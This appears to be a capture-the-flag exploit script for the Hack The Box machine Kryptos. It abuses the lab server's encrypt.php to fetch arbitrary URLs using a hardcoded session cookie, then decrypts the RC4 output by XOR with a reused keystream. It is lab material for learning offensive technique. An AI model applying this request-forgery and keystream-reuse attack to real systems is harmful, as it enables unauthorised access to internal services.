#
# From Ippsec YouTube Video of HtB Kryptos
#
# https://youtu.be/4uCoI5YzOwk
# 

import requests
from base64 import b64decode
import re
from cmd import Cmd

class Terminal(Cmd):
    def __init__(self):
        self.prompt = '>'
        self.cookies = {
                'PHPSESSID': 'r4gpbq65pertuh39dgmk0jg93o'
                }

        Cmd.__init__(self)

    def default(self, args):
        params = {
                    'cipher':'RC4',
                    'url':args
                }
        r = requests.get('http://10.10.10.129/encrypt.php', cookies=self.cookies, params=params)
        unknown_text = re.findall('>(.*?)</textarea>',r.text)[0]
        decrypted = decrypt(unknown_text)
        try:
            print(decrypted.decode('utf-8'))
        except:
            print(decrypted)

def decrypt(cipher):

    key = open('key.txt').read().rstrip()
    key = b64decode(key)
    cipher = b64decode(cipher)
    pt = bytes(x^y for (x,y) in zip(key, cipher))
    return pt

terminal = Terminal()
terminal.cmdloop()
